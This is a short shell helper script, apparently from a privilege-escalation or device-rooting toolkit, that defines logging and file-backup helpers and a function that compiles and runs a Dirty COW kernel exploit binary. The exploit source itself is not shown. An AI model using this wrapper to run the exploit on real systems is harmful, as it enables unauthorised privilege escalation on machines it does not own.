export scriptdir="$(dirname "$0")"
export appdir="$scriptdir/../app"

echoerr() {
	echo "$@" >&2
}

die() {
	echoerr "$@"
	exit 1
}

backup() {
	if [ $# -ne 2 ]; then
		echoerr "Expected 2 arguments, got $#"
		return 1
	fi

	cp "$1" "$2"
	echoerr "Backed up $1 to $2"
}

dirtycow() {
	local exe="$appdir/dirtycow"

	if [ ! -x "$exe" ]; then
		make -C "$appdir" || die "Failed to compile Dirty COW exploit."
		[ -x "$exe" ]     || die "Executable not found: $exe"
	fi

	"$exe" $@
}
